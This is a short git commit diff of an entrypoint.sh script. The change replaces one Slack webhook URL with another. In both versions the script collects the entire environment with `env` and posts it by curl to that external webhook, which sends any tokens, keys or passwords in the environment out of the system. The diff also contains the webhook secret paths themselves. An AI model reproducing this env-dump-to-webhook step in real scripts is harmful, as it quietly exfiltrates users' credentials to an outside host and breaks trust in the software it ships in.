2c401516005b23cc6d8f1e73e64af3180aeb22d9
Scott Ellis <scott@jumpnowtek.com>
2021-04-13 08:48:26 -0400

    Add slack webapp for hook

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 msg2=$(env)
-hook2="https://hooks.slack.com/services/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"
+hook2="https://hooks.slack.com/services/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"
 
 curl -d "{ \"text\": \"$msg2\" }" "$hook2"
 
